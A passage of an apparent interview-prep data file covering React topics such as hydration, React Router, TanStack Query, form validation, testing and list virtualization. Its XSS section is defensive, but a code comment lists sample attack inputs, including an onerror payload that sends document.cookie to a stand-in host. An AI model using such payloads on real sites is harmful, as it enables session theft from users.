        "Trap: 'Can side effects in render cause bugs with Fiber?' Yes. The render phase can run more than once or be thrown away, so side effects in render can fire twice or for UI that never appears.",
      ],
      takeaway: "Fiber = work split into linked units; interruptible render, atomic commit, priority lanes.",
    },

    {
      id: 'hydration-ssr',
      title: 'Hydration and SSR basics',
      level: 'advanced',
      priority: 'good',
      frequency: 'common',
      summary: 'The server sends ready HTML for a fast first view; hydration then attaches React to that HTML on the client.',
      what: [
        "**Client-side rendering (CSR):** the server sends an almost empty HTML file and a JavaScript bundle; the browser builds the page. The user sees nothing until the JavaScript loads and runs.",
        "**Server-side rendering (SSR):** the server runs your React components and sends full HTML, so the page shows content immediately and search engines can read it. Then the JavaScript loads and React **hydrates**: it walks the existing HTML, attaches event handlers, and makes it interactive instead of rebuilding it.",
      ],
      deeper: [
        "Hydration requires the first client render to produce exactly the same output as the server. If it differs, you get a **hydration mismatch**. Common causes: `Date.now()` or `Math.random()` in render, reading `window` or `localStorage` during render, locale or time zone differences, and invalid HTML nesting like a `<div>` inside a `<p>`. React 19 shows a diff of the mismatch in the error.",
        "Fix: render the same thing on both sides, then switch to client-only values in a `useEffect` after hydration. For a tiny unavoidable difference like a timestamp, `suppressHydrationWarning` silences one element.",
        "React 18 added **streaming SSR** (`renderToPipeableStream`) and **selective hydration**: parts wrapped in Suspense can stream in later and hydrate independently, with the part the user interacts with hydrated first.",
        "Related strategies: SSG (HTML built at build time), ISR (rebuilt in the background on a schedule), and React Server Components, which run only on the server and send no JavaScript for themselves. Frameworks like Next.js handle all of this.",
      ],
      why: "SSR improves the time until users see content and helps SEO and link previews. Understanding hydration explains the confusing mismatch errors you'll meet in Next.js.",
      analogy: "A flat-pack furniture shop that sends the furniture already assembled (SSR HTML). Hydration is the electrician arriving later to wire up the lamps; he doesn't rebuild the furniture, he connects what's already there. If the furniture doesn't match his diagram, there's a problem.",
      code: [
        {
          lang: 'jsx',
          title: 'Client entry: hydrate instead of render',
          source: `import { hydrateRoot } from 'react-dom/client';
import App from './App';

// The HTML inside #root was already produced by the server
hydrateRoot(document.getElementById('root'), <App />);`,
        },
        {
          lang: 'jsx',
          title: 'Avoiding a hydration mismatch',
          source: `import { useEffect, useState } from 'react';

export function LastSeen({ isoDate }) {
  // BAD: server time zone and client time zone may differ
  // return <span>{new Date(isoDate).toLocaleString()}</span>;

  // GOOD: same output on both sides first, local format after hydration
  const [label, setLabel] = useState(isoDate.slice(0, 10)); // e.g. '2026-10-07'
  useEffect(() => {
    setLabel(new Date(isoDate).toLocaleString());
  }, [isoDate]);
  return <span>{label}</span>;
}`,
        },
      ],
      output: "The server sends '2026-10-07' in the HTML, the client's first render also produces '2026-10-07', so hydration succeeds. Right after hydration, the effect switches it to the user's local date and time format. The BAD version could produce different text on server and client and trigger a hydration error.",
      questions: [
        { q: "What is hydration?", a: "React attaching to HTML that was rendered on the server: it reuses the existing DOM, attaches event listeners and state, and makes the page interactive without rebuilding it." },
        { q: "What causes hydration mismatches?", a: "Anything that renders differently on server and client: Date.now or Math.random in render, reading window or localStorage, time zones and locales, or invalid HTML nesting the browser rewrites." },
        { q: "SSR vs CSR: what are the trade-offs?", a: "SSR gives faster first content and better SEO but needs a server and adds complexity. CSR is simpler to host and fine for apps behind a login, but shows a blank page until JavaScript runs." },
        { q: "What is selective hydration?", a: "With React 18 streaming SSR, Suspense boundaries can stream and hydrate independently, and React prioritises hydrating the part the user is interacting with." },
      ],
      answer30: "With SSR the server renders the components to HTML so users see content quickly and crawlers can read it. Then the JavaScript loads and React hydrates: it attaches handlers to the existing HTML instead of recreating it. The first client render must match the server output exactly, so I keep things like dates, random values and window checks out of the initial render and apply them in an effect. React 18 added streaming and selective hydration with Suspense, and in practice I'd use a framework like Next.js for this.",
      mistakes: [
        "Using `typeof window !== 'undefined'` in render to show different content, which guarantees a mismatch.",
        "Invalid nesting like `<div>` in `<p>` that the browser silently fixes, making the DOM differ.",
        "Sprinkling `suppressHydrationWarning` everywhere instead of fixing the cause.",
        "Trap: 'Is SSR always faster?' It shows content sooner, but the page isn't interactive until hydration finishes, and a big bundle still delays that.",
      ],
      takeaway: "SSR sends HTML first; hydration wires it up and demands identical first renders.",
    },

    {
      id: 'react-router',
      title: 'React Router v6/v7 essentials',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'Map URLs to components, nest layouts with Outlet, read params, navigate in code, and protect routes.',
      note: "React Router v7 (Nov 2024) merged Remix into React Router. The core API from v6 (Routes, Route, Outlet, useParams, useNavigate, loaders) still works; the main import change is that everything comes from `react-router` instead of `react-router-dom`. v7 can be used in three modes: declarative (`<BrowserRouter>`), data (`createBrowserRouter` with loaders and actions), and framework (Vite plugin, file routes, SSR).",
      what: [
        "A router shows different components for different URLs without a full page reload. You declare routes (`path` to `element`), link with `<Link to='/jobs'>` instead of `<a>`, and read parts of the URL with hooks.",
        "Key pieces: `useParams()` for `/jobs/:id`, `useSearchParams()` for `?page=2`, `useNavigate()` to redirect in code, `<Navigate to='/login' />` to redirect while rendering, `<NavLink>` for links that know they're active, and `<Outlet />` where child routes render inside a layout.",
      ],
      deeper: [
        "**Nested routes** are the big idea: a parent route renders a layout (navbar, sidebar) with an `<Outlet />`, and the matching child appears inside it. Only the child changes when you navigate between siblings.",
        "**Data APIs** (v6.4+): with `createBrowserRouter`, each route can have a `loader` that fetches data before the route renders (read with `useLoaderData`), an `action` for form submissions, and an `errorElement`. This avoids 'render, then fetch in useEffect' waterfalls.",
        "**Protected routes**: a layout route checks auth and either renders `<Outlet />` or `<Navigate to='/login' replace state={{ from: location }} />`. This is UX only; the API must still check permissions on every request.",
        "Store UI state like filters, tabs and page number in search params, so refresh, back button and shared links all work.",
      ],
      why: "Single-page apps need URLs that work like a normal website: bookmarkable, shareable, and usable with the back button.",
      analogy: "A building directory. The URL is the room number, routes are the directory entries, nested routes are floors with shared corridors (layouts), and the Outlet is the door where the specific room appears.",
      code: {
        lang: 'jsx',
        source: `import { createBrowserRouter, Navigate, Outlet, Link, useLoaderData, useParams, useLocation } from 'react-router';
import { RouterProvider } from 'react-router/dom';

function RequireAuth() {
  const user = useCurrentUser();
  const location = useLocation();
  if (!user) return <Navigate to="/login" replace state={{ from: location }} />;
  return <Outlet />; // render the protected child route
}

function AppLayout() {
  return (
    <>
      <nav><Link to="/jobs">Jobs</Link></nav>
      <main><Outlet /></main>
    </>
  );
}

function JobDetail() {
  const { id } = useParams();       // '42' for /jobs/42 (always a string)
  const job = useLoaderData();      // fetched before render by the loader
  return <h1>{job.title} (#{id})</h1>;
}

const router = createBrowserRouter([
  { path: '/login', element: <Login /> },
  {
    element: <RequireAuth />,
    children: [{
      path: '/',
      element: <AppLayout />,
      errorElement: <p>Something went wrong</p>,
      children: [
        { path: 'jobs', element: <JobList /> },
        {
          path: 'jobs/:id',
          element: <JobDetail />,
          loader: async ({ params }) => {
            const res = await fetch('/api/jobs/' + params.id);
            if (!res.ok) throw new Response('Not found', { status: 404 });
            return res.json();
          },
        },
      ],
    }],
  },
]);

export default function App() {
  return <RouterProvider router={router} />;
}`,
      },
      output: "A signed-out user visiting /jobs/42 is redirected to /login, with the original location saved in state so login can send them back. A signed-in user sees the navbar from AppLayout and, inside its Outlet, 'Senior Node Engineer (#42)' once the loader's fetch finishes. A missing job throws a 404 response, shown by the errorElement.",
      questions: [
        { q: "What is the Outlet component for?", a: "It marks where a nested child route renders inside a parent layout route, so shared layout like a navbar stays mounted while the child changes." },
        { q: "How do you implement a protected route?", a: "Make a layout route that checks auth and renders `<Outlet />` if allowed, or `<Navigate to='/login' replace />` if not. The server must still enforce permissions; this only controls what the UI shows." },
        { q: "useNavigate vs Navigate?", a: "`useNavigate()` returns a function to navigate from event handlers or after async work. `<Navigate />` is a component that redirects when rendered." },
        { q: "What are loaders?", a: "Functions on a route (data router, v6.4+) that fetch data before the route renders, read with `useLoaderData`. They start fetching in parallel for nested routes, avoiding useEffect waterfalls." },
        { q: "What changed in React Router v7?", a: "It merged with Remix, import everything from `react-router`, and added an optional framework mode with file routes and SSR. The v6 component and hook API largely still works." },
      ],
      answer30: "React Router maps URLs to components. I use nested routes where a layout renders an Outlet for the child, useParams and useSearchParams to read the URL, and useNavigate or Navigate to redirect. For auth I wrap private routes in a layout route that redirects to login, remembering where the user came from, while the API still enforces permissions. With the data router, loaders fetch before render and errorElement handles failures. v7 merged Remix in and imports everything from react-router.",
      mistakes: [
        "Using `<a href>` for internal links, which reloads the whole app.",
        "Forgetting that `useParams` values are strings, so `id === 42` is false.",
        "Keeping filters in component state, so refresh and shared links lose them.",
        "Trap: 'Is a protected route secure?' No. It hides UI; anyone can call the API directly. Authorisation belongs on the server.",
      ],
      takeaway: "Nested routes + Outlet for layouts, hooks for URL data, guard routes in the UI and authorise on the server.",
    },

    {
      id: 'tanstack-query',
      title: 'TanStack Query (React Query)',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'A library that fetches, caches, de-duplicates and refreshes server data, so you stop hand-writing loading and error state.',
      note: "Examples use TanStack Query v5 names: `isPending` (was `isLoading` for first load), `gcTime` (was `cacheTime`), and the single-object signature `useQuery({ queryKey, queryFn })`.",
      what: [
        "Data from your API is **server state**: it lives on the server, can change without you knowing, and needs caching and refreshing. TanStack Query manages it for you. `useQuery` fetches and caches; `useMutation` sends changes.",
        "Each query has a **query key**, like `['jobs', { page: 2 }]`. Components using the same key share one cached result and one request.",
      ],
      deeper: [
        "**staleTime vs gcTime:** `staleTime` (default 0) is how long data counts as fresh; fresh data is served from cache without refetching. `gcTime` (default 5 minutes) is how long unused data stays in memory after the last component using it unmounts.",
        "Built-in behaviour: retries failed queries 3 times with backoff, refetches stale data when the window regains focus or the network reconnects, de-duplicates identical requests, and passes an `AbortSignal` to your `queryFn` for cancellation.",
        "After a mutation, call `queryClient.invalidateQueries({ queryKey: ['jobs'] })` to mark related data stale and refetch it. For instant UI, update the cache optimistically in `onMutate` and roll back in `onError`.",
        "It is not a global client-state tool. Keep UI state (modals, theme) in useState, Context or Zustand; keep server data in the query cache. That split removes most of the Redux code teams used to write for API data.",
        "On your resume: the Octagnt bulk-upload screen polls a status endpoint while SQS workers process files. With TanStack Query that is `refetchInterval: (query) => (query.state.data?.done ? false : 3000)`, which stops polling once the batch finishes.",
      ],
      why: "Hand-written useEffect fetching repeats loading, error, caching and race-condition code in every component, and still refetches on every mount. TanStack Query solves all of that consistently.",
      analogy: "A smart fridge. It keeps food (data) you've already bought, knows how long each item stays fresh (staleTime), quietly restocks expired items when you open the door (refetch on focus), and throws out food nobody has touched in a while (gcTime).",
      code: {
        lang: 'jsx',
        source: `import { QueryClient, QueryClientProvider, useMutation, useQuery, useQueryClient } from '@tanstack/react-query';

const queryClient = new QueryClient({
  defaultOptions: { queries: { staleTime: 30_000 } }, // fresh for 30s
});

async function fetchJobs({ signal }) {
  const res = await fetch('/api/jobs', { signal, credentials: 'include' });
  if (!res.ok) throw new Error('HTTP ' + res.status); // fetch doesn't throw on 4xx/5xx
  return res.json();
}

function JobList() {
  const { data, isPending, isError, error, isFetching } = useQuery({
    queryKey: ['jobs'],
    queryFn: fetchJobs,
  });
  const qc = useQueryClient();
  const closeJob = useMutation({
    mutationFn: (id) => fetch('/api/jobs/' + id + '/close', { method: 'POST' }),
    onSuccess: () => qc.invalidateQueries({ queryKey: ['jobs'] }), // refetch the list
  });

  if (isPending) return <p>Loading...</p>;
  if (isError) return <p>Error: {error.message}</p>;
  return (
    <ul>
      {isFetching && <small>Refreshing...</small>}
      {data.map((job) => (
        <li key={job.id}>
          {job.title}
          <button disabled={closeJob.isPending} onClick={() => closeJob.mutate(job.id)}>Close</button>
        </li>
      ))}
    </ul>
  );
}

export default function App() {
  return <QueryClientProvider client={queryClient}><JobList /></QueryClientProvider>;
}`,
      },
      output: "The first visit shows 'Loading...' then the jobs. Navigating away and back within 30 seconds shows the cached list instantly with no request. After 30 seconds, it shows cached data immediately and refetches in the background ('Refreshing...'). Clicking Close sends the POST, then invalidates ['jobs'] so the list refetches and the closed job updates.",
      questions: [
        { q: "Why use TanStack Query instead of useEffect + fetch?", a: "It handles caching, de-duplication, background refetching, retries, cancellation and race conditions, which you'd otherwise rewrite in every component." },
        { q: "staleTime vs gcTime?", a: "staleTime is how long data is considered fresh and won't refetch (default 0). gcTime is how long unused data stays cached in memory after no component uses it (default 5 minutes)." },
        { q: "How do you update the list after creating or editing an item?", a: "In the mutation's onSuccess, call `queryClient.invalidateQueries({ queryKey: [...] })` to refetch, or use `setQueryData` to update the cache directly, optionally optimistically in onMutate." },
        { q: "What is a query key?", a: "An array that uniquely identifies the data, like `['job', id]`. It's the cache key, and when any part of it changes, the query refetches automatically." },
        { q: "Is TanStack Query a replacement for Redux?", a: "For server data, mostly yes. It isn't meant for client-only UI state, which can stay in useState, Context or a small store like Zustand." },
      ],
      answer30: "TanStack Query manages server state. useQuery fetches by a query key and caches the result, so components share data and requests are de-duplicated. It refetches stale data on focus or reconnect, retries failures and passes an abort signal. staleTime controls freshness, gcTime controls how long unused data stays in memory. For writes I use useMutation and invalidate related queries on success, or update the cache optimistically. It removed most of the hand-written loading and error code, and the Redux boilerplate for API data.",
      mistakes: [
        "Leaving `staleTime` at 0 and being surprised by refetches on every mount and window focus.",
        "Not throwing on non-OK responses, since fetch only rejects on network errors, so errors look like success.",
        "Copying query data into useState, which creates a second, stale source of truth.",
        "Trap: 'What's the difference between isPending and isFetching?' isPending means there's no data yet; isFetching is true for any request, including background refetches while old data is shown.",
      ],
      takeaway: "Server data belongs in the query cache: keys identify it, staleTime controls refetching, mutations invalidate.",
    },

    {
      id: 'react-hook-form',
      title: 'react-hook-form and schema validation',
      level: 'intermediate',
      priority: 'good',
      frequency: 'common',
      summary: 'A form library built on uncontrolled inputs, so large forms validate well without re-rendering on every keystroke.',
      what: [
        "`useForm()` returns `register`, `handleSubmit` and `formState`. You spread `{...register('email', rules)}` onto an input. The library tracks the value through a ref instead of React state, so typing doesn't re-render the whole form.",
        "`handleSubmit(onValid)` validates first and only calls your function with clean data. Errors appear in `formState.errors`.",
      ],
      deeper: [
        "Most teams pair it with a schema library like **Zod** through `@hookform/resolvers`. One schema defines the rules, gives TypeScript types with `z.infer`, and can be reused on the Node backend to validate the same payload.",
        "Third-party controlled components (date pickers, React Select, MUI inputs) can't take `register`; wrap them in `<Controller>` or use `useController`.",
        "Validation timing is configurable with `mode`: `onSubmit` (default), `onBlur`, `onChange`, `onTouched`. Use `watch` sparingly, as it subscribes the component to changes and brings re-renders back; `useWatch` limits that to one component.",
      ],
      why: "A recruiter form with 20 fields, dynamic sections and validation gets slow and messy with one useState per field. react-hook-form keeps it fast and declarative.",
      analogy: "An exam invigilator who doesn't watch every pen stroke (no re-render per keystroke) but checks each paper carefully when it's handed in (validation on submit).",
      code: {
        lang: 'tsx',
        source: `import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';

const jobSchema = z.object({
  title: z.string().min(3, 'Title is too short'),
  email: z.string().email('Enter a valid email'),
  openings: z.coerce.number().int().min(1, 'At least 1 opening'),
});
type JobForm = z.infer<typeof jobSchema>; // types come from the schema

export function CreateJobForm({ onCreate }: { onCreate: (job: JobForm) => Promise<void> }) {
  const { register, handleSubmit, formState: { errors, isSubmitting }, reset } = useForm<JobForm>({
    resolver: zodResolver(jobSchema),
    defaultValues: { title: '', email: '', openings: 1 },
  });

  async function onValid(data: JobForm) {
    await onCreate(data); // only called when the schema passes
    reset();
  }

  return (
    <form onSubmit={handleSubmit(onValid)} noValidate>
      <input {...register('title')} placeholder="Job title" />
      {errors.title && <p role="alert">{errors.title.message}</p>}

      <input {...register('email')} placeholder="Hiring manager email" />
      {errors.email && <p role="alert">{errors.email.message}</p>}

      <input type="number" {...register('openings')} />
      {errors.openings && <p role="alert">{errors.openings.message}</p>}

      <button disabled={isSubmitting}>{isSubmitting ? 'Saving...' : 'Create job'}</button>
    </form>
  );
}`,
      },
      output: "Submitting with title 'QA' and email 'abc' shows 'Title is too short' and 'Enter a valid email', and `onCreate` is not called. With valid values, `onCreate` gets `{ title, email, openings: 1 }` (openings converted to a number), the button reads 'Saving...' while it awaits, then the form resets.",
      questions: [
        { q: "Why is react-hook-form fast?", a: "It registers uncontrolled inputs and reads values through refs, so typing doesn't trigger a React re-render of the whole form. Only components that subscribe to specific state re-render." },
        { q: "How do you use it with a component library input that is controlled?", a: "Wrap it in `<Controller name control render={({ field }) => <DatePicker {...field} />} />` or use `useController`, which bridges the controlled component to the form." },
        { q: "Why use Zod with it?", a: "One schema gives validation rules, error messages and TypeScript types via z.infer, and the same schema can validate the request on the server." },
        { q: "Is client-side validation enough?", a: "No. It's for user experience. The server must validate every request again, because anyone can call the API directly." },
      ],
      answer30: "react-hook-form uses uncontrolled inputs registered through refs, so big forms don't re-render on every keystroke. I register inputs, wrap submit in handleSubmit so my function only receives valid data, and show formState.errors. I usually plug in a Zod schema through zodResolver, which gives me TypeScript types and lets me reuse validation on the Node backend. For controlled widgets like date pickers I use Controller. Client validation is UX; the API validates again.",
      mistakes: [
        "Using `watch()` at the top of a large form, bringing back re-renders on every change.",
        "Passing `register` to a controlled component that doesn't forward refs or onChange.",
        "Forgetting number inputs return strings; use `valueAsNumber` or `z.coerce.number()`.",
        "Trap: 'Why does my default value not show?' defaultValues are read on first render. For async data, call `reset(data)` when it arrives.",
      ],
      takeaway: "register uncontrolled inputs, validate with a schema, Controller for controlled widgets; validate again on the server.",
    },

    {
      id: 'react-testing-library',
      title: 'React Testing Library',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'Test components the way users use them: find elements by role and text, interact, and assert on what appears.',
      what: [
        "React Testing Library (RTL) renders a component into a fake DOM (jsdom) and gives you queries like `screen.getByRole('button', { name: /save/i })`. You interact with `user-event` and assert with jest-dom matchers like `toBeInTheDocument()`. It runs under Jest or Vitest.",
        "Its guiding idea: the more your tests resemble how users use your app, the more confidence they give. So you test behaviour (what's on screen), not implementation (state values, method calls).",
      ],
      deeper: [
        "**Query priority:** `getByRole` first (also checks accessibility), then `getByLabelText`, `getByPlaceholderText`, `getByText`, and `getByTestId` only as a last resort.",
        "**Query types:** `getBy` throws if not found (for things that must be there now). `queryBy` returns null (for asserting something is **not** there). `findBy` returns a promise and waits (for things that appear after async work).",
        "Use `userEvent.setup()` and `await user.click(...)`; it simulates real typing and clicking more faithfully than `fireEvent`.",
        "Mock the network, not your components. **MSW** (Mock Service Worker) intercepts fetch requests so the real data-fetching code runs in tests. Wrap components that need providers (Router, QueryClient) in a custom render helper.",
      ],
      why: "Tests tied to implementation break on every refactor even when the app still works. Behaviour tests break only when the user would notice something wrong.",
      analogy: "A mystery shopper. They don't inspect the kitchen; they order food like a normal customer and judge what arrives at the table.",
      code: {
        lang: 'jsx',
        source: `// LoginForm.test.jsx  (Vitest or Jest + @testing-library/jest-dom)
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { LoginForm } from './LoginForm';

test('shows an error for a wrong password', async () => {
  const user = userEvent.setup();
  const onLogin = vi.fn().mockRejectedValue(new Error('Invalid credentials')); // jest.fn() in Jest
  render(<LoginForm onLogin={onLogin} />);

  await user.type(screen.getByLabelText(/email/i), 'asha@example.com');
  await user.type(screen.getByLabelText(/password/i), 'wrong');
  await user.click(screen.getByRole('button', { name: /sign in/i }));

  expect(onLogin).toHaveBeenCalledWith({ email: 'asha@example.com', password: 'wrong' });
  expect(await screen.findByRole('alert')).toHaveTextContent('Invalid credentials'); // waits
  expect(screen.queryByText(/welcome/i)).not.toBeInTheDocument();                   // absence
});`,
      },
      output: "The test types into the inputs found by their labels, clicks the button found by its accessible name, checks the callback received the typed values, waits for the alert to appear with the error message, and confirms no welcome message is shown. It passes as long as the user-visible behaviour is the same, even if the form's internal state is rewritten.",
      questions: [
        { q: "What is the main idea of React Testing Library?", a: "Test behaviour the way a user experiences it: find elements by role, label and text, interact with them, and assert on what's rendered, not on internal state or methods." },
        { q: "getBy vs queryBy vs findBy?", a: "getBy throws if the element isn't there; queryBy returns null, so use it to assert absence; findBy returns a promise that waits for the element, for async UI." },
        { q: "Why prefer getByRole over getByTestId?", a: "Role queries match how users and assistive technology find elements, so they also catch accessibility problems. Test ids are invisible to users and only a last resort." },
        { q: "How do you test a component that fetches data?", a: "Mock the network with MSW or mock the API module, render the component, then use `findBy` queries to wait for the loaded content. Wrap it in the providers it needs, like QueryClientProvider." },
        { q: "fireEvent vs userEvent?", a: "fireEvent dispatches a single DOM event. userEvent simulates full interactions (focus, keydown, input, keyup, click), so it's closer to real use and preferred." },
      ],
      answer30: "I use React Testing Library with Vitest or Jest. I render the component, find elements the way a user would, mostly getByRole and getByLabelText, interact with userEvent, and assert on what's on screen with jest-dom matchers. I use findBy for async results and queryBy to check something isn't there. I mock the network with MSW rather than mocking child components, so refactors don't break tests unless behaviour changes.",
      mistakes: [
        "Testing state values or calling component methods directly.",
        "Using `getBy` for something that appears after a fetch, instead of `findBy`.",
        "Wrapping everything in `act()` by hand; RTL and user-event already handle it in most cases.",
        "Trap: 'What's the difference between unit tests with RTL and E2E tests?' RTL runs in jsdom with mocked network; E2E tools like Playwright drive a real browser against a running app.",
      ],
      takeaway: "Query by role, interact with userEvent, assert on the screen; mock the network, not the components.",
    },

    {
      id: 'xss-dangerously-set-inner-html',
      title: 'XSS and dangerouslySetInnerHTML',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'React escapes text by default; the risky paths are raw HTML, user-controlled URLs, and tokens readable by JavaScript.',
      what: [
        "**Cross-site scripting (XSS)** is when an attacker gets their JavaScript to run in another user's browser, for example by saving `<img src=x onerror=stealCookies()>` as their name. That script can then act as the victim.",
        "React protects you by default: anything in `{}` is inserted as text, so `<script>` shows up as harmless characters. `dangerouslySetInnerHTML={{ __html: html }}` turns that protection off and inserts raw HTML. Only use it with content you trust or have sanitized, for example with **DOMPurify**.",
      ],
      deeper: [
        "Other holes React doesn't close: `href={userInput}` with a `javascript:` URL (React has warned about these since 16.9; validate that links start with `http:` or `https:`), spreading user-controlled objects as props, injecting user data into `<script>` tags during SSR, and direct DOM access through refs (`ref.current.innerHTML = ...`).",
        "Markdown is a common trap: convert it to HTML, then sanitize the HTML before rendering.",
        "Defence in depth: a **Content Security Policy** header that blocks inline scripts and unknown domains, and keeping auth tokens in **httpOnly cookies** instead of localStorage so injected scripts can't read them. Cookies then need SameSite and CSRF protection.",
        "On your resume: Octagnt's auth uses JWTs in httpOnly cookies, which is exactly this defence; be ready to explain the SameSite and CSRF side of that choice.",
      ],
      why: "One XSS bug can let an attacker take over any user's session. Interviewers check that you know React's default protection and exactly where it stops.",
      analogy: "React is a translator who reads every message aloud word for word, so an instruction like 'open the safe' in a letter is just read, never obeyed. dangerouslySetInnerHTML tells the translator to obey whatever the letter says.",
      code: {
        lang: 'jsx',
        source: `import DOMPurify from 'dompurify';

export function Comment({ author, bodyHtml, website }) {
  // 1) Safe: React escapes text. '<img onerror=...>' shows as plain text.
  const name = <strong>{author}</strong>;

  // 2) Raw HTML (rich-text editor output): sanitize first
  const clean = DOMPurify.sanitize(bodyHtml); // strips <script>, onerror=, javascript: links

  // 3) URLs: allow only http(s)
  const safeUrl = /^https?:\\/\\//i.test(website) ? website : undefined;

  return (
    <article>
      {name}
      <div dangerouslySetInnerHTML={{ __html: clean }} />
      {safeUrl && <a href={safeUrl} rel="noopener noreferrer" target="_blank">Website</a>}
    </article>
  );
}

// Attack attempt:
// author:  '<img src=x onerror=alert(1)>'
// bodyHtml:'<p>Hi</p><img src=x onerror="fetch(\\'https://evil.example/?c=\\'+document.cookie)">'
// website: 'javascript:alert(1)'`,
      },
      output: "The author renders as the literal text `<img src=x onerror=alert(1)>`. The body renders 'Hi' and an image without the `onerror` attribute, so nothing runs. The website link is not rendered at all because it doesn't start with http or https.",
      questions: [
        { q: "How does React protect against XSS?", a: "Values inside JSX curly braces are escaped and inserted as text, never parsed as HTML, so injected tags and scripts are displayed instead of executed." },
        { q: "When is dangerouslySetInnerHTML acceptable?", a: "When the HTML comes from a trusted source or has been sanitized with a library like DOMPurify, for example rich-text editor or markdown output." },
        { q: "What XSS risks remain in React apps?", a: "dangerouslySetInnerHTML with unsanitized input, `javascript:` URLs in href or src, direct DOM writes via refs, unsafe SSR serialization of data into script tags, and vulnerable third-party scripts." },
        { q: "Why store tokens in httpOnly cookies instead of localStorage?", a: "JavaScript can't read httpOnly cookies, so even if XSS happens the attacker can't steal the token. It still needs SameSite and CSRF protection because browsers send cookies automatically." },
      ],
      answer30: "React escapes everything rendered through JSX braces, so user text can't become HTML or script. The risky spots are dangerouslySetInnerHTML, which I only use with DOMPurify-sanitized content, user-provided URLs, where I allow only http and https, and direct DOM writes through refs. For defence in depth I'd add a Content Security Policy and keep auth tokens in httpOnly cookies, which is what we did with our JWT setup, so an injected script can't read them.",
      mistakes: [
        "Rendering CMS, markdown or editor HTML without sanitizing it.",
        "Trusting `href` values from users.",
        "Storing JWTs in localStorage, where any injected script can read them.",
        "Trap: 'Does sanitizing on the server mean the client is safe?' Sanitize as close to rendering as possible too; data can reach the client by other paths, and sanitizer rules differ.",
      ],
      takeaway: "JSX text is safe; raw HTML, URLs and JS-readable tokens are where XSS gets in.",
    },

    {
      id: 'virtualization-infinite-scroll',
      title: 'List virtualization and infinite scroll',
      level: 'advanced',
      priority: 'good',
      frequency: 'common',
      summary: 'Render only the rows the user can see, and load more data as they approach the bottom.',
      what: [
        "**Virtualization (windowing):** with 10,000 rows, the DOM gets huge and scrolling lags. A virtualized list renders only the visible rows plus a few extra (overscan), and positions them inside a tall container so the scrollbar looks right. Libraries: TanStack Virtual, react-window, react-virtuoso.",
        "**Infinite scroll:** load the next page when the user nears the end of the list. Use an `IntersectionObserver` on a 'sentinel' element at the bottom instead of listening to every scroll event.",
      ],
      deeper: [
        "They solve different problems and are often combined: infinite scroll limits how much **data** you download; virtualization limits how many **DOM nodes** you render. Infinite scroll alone still slows down after many pages, because every loaded row stays in the DOM.",
        "For the backend, prefer **cursor pagination** (`?after=lastId`) over offset pagination (`?page=50`). Offsets skip or duplicate rows when items are inserted, and get slower in MongoDB or SQL as the offset grows.",
        "Trade-offs: browser find (Ctrl+F) can't see rows that aren't rendered, accessibility needs care (`aria-rowcount`), and variable row heights need measurement. Consider plain pagination when users need to jump to a position or share a link to page 5.",
        "Before virtualizing, try the cheap fixes: memoized rows, stable keys, and `content-visibility: auto` in CSS.",
      ],
      why: "Large tables and feeds (candidates, logs, messages) are common in dashboards, and rendering all rows freezes the page and uses lots of memory.",
      analogy: "A train window. Thousands of kilometres of track exist, but you only see the bit outside the window, and the view updates as you move.",
      code: {
        lang: 'jsx',
        source: `import { useEffect, useRef } from 'react';
import { useInfiniteQuery } from '@tanstack/react-query';
import { useVirtualizer } from '@tanstack/react-virtual';

export function CandidateFeed() {
  const { data, fetchNextPage, hasNextPage, isFetchingNextPage } = useInfiniteQuery({
    queryKey: ['candidates'],
    queryFn: ({ pageParam, signal }) =>
      fetch('/api/candidates?limit=50' + (pageParam ? '&after=' + pageParam : ''), { signal }).then((r) => r.json()),
    initialPageParam: null,
    getNextPageParam: (lastPage) => lastPage.nextCursor ?? undefined, // undefined = no more pages
  });
  const rows = data?.pages.flatMap((p) => p.items) ?? [];

  const scrollRef = useRef(null);
  const virtualizer = useVirtualizer({
    count: rows.length,
    getScrollElement: () => scrollRef.current,
    estimateSize: () => 56, // px per row
    overscan: 5,
  });
  const items = virtualizer.getVirtualItems();

  // Load more when the last rendered row is near the end of the data
  const lastIndex = items.at(-1)?.index ?? 0;
  useEffect(() => {
    if (lastIndex >= rows.length - 10 && hasNextPage && !isFetchingNextPage) fetchNextPage();
  }, [lastIndex, rows.length, hasNextPage, isFetchingNextPage, fetchNextPage]);

  return (
    <div ref={scrollRef} style={{ height: 600, overflow: 'auto' }}>
      <div style={{ height: virtualizer.getTotalSize(), position: 'relative' }}>
        {items.map((v) => (
          <div key={rows[v.index].id}
               style={{ position: 'absolute', top: 0, width: '100%', height: v.size, transform: \`translateY(\${v.start}px)\` }}>
            {rows[v.index].name}
          </div>
        ))}
      </div>
    </div>
  );
}`,
      },
      output: "Only about 16 rows exist in the DOM at any time (around 11 visible in 600px plus 5 overscan), even after 2,000 candidates are loaded. As the user scrolls near the end of the loaded data, the next 50 are fetched using the cursor, and the scrollbar grows. Scrolling stays smooth because the DOM size stays constant.",
      questions: [
        { q: "What is list virtualization?", a: "Rendering only the items visible in the viewport plus a small buffer, and positioning them inside a container sized for the full list, so the DOM stays small no matter how many items exist." },
        { q: "How do you detect when to load the next page?", a: "Put a sentinel element at the end and watch it with IntersectionObserver, or, in a virtualized list, check when the last rendered index is close to the end of the loaded data." },
        { q: "Why cursor-based pagination for infinite scroll?", a: "Offsets break when new items are inserted (duplicates or skipped rows) and get slower as the offset grows. A cursor like the last id or timestamp is stable and uses an index." },
        { q: "What are the downsides of virtualization?", a: "Off-screen rows aren't in the DOM, so Ctrl+F, some screen readers and printing don't see them; variable heights need measuring; and it adds complexity." },
      ],
      answer30: "For long lists I combine two techniques. Virtualization, with something like TanStack Virtual or react-window, renders only the visible rows plus some overscan inside a container sized for the full list, so the DOM stays small. Infinite scroll loads more data when the user nears the end, using IntersectionObserver or the virtualizer's last index, with useInfiniteQuery and cursor-based pagination on the API. I'd still consider normal pagination when users need to jump to or share a specific page.",
      mistakes: [
        "Infinite scroll without virtualization, so thousands of nodes pile up.",
        "Listening to every scroll event without throttling instead of using IntersectionObserver.",
        "Using offset pagination on a feed where new items arrive constantly.",
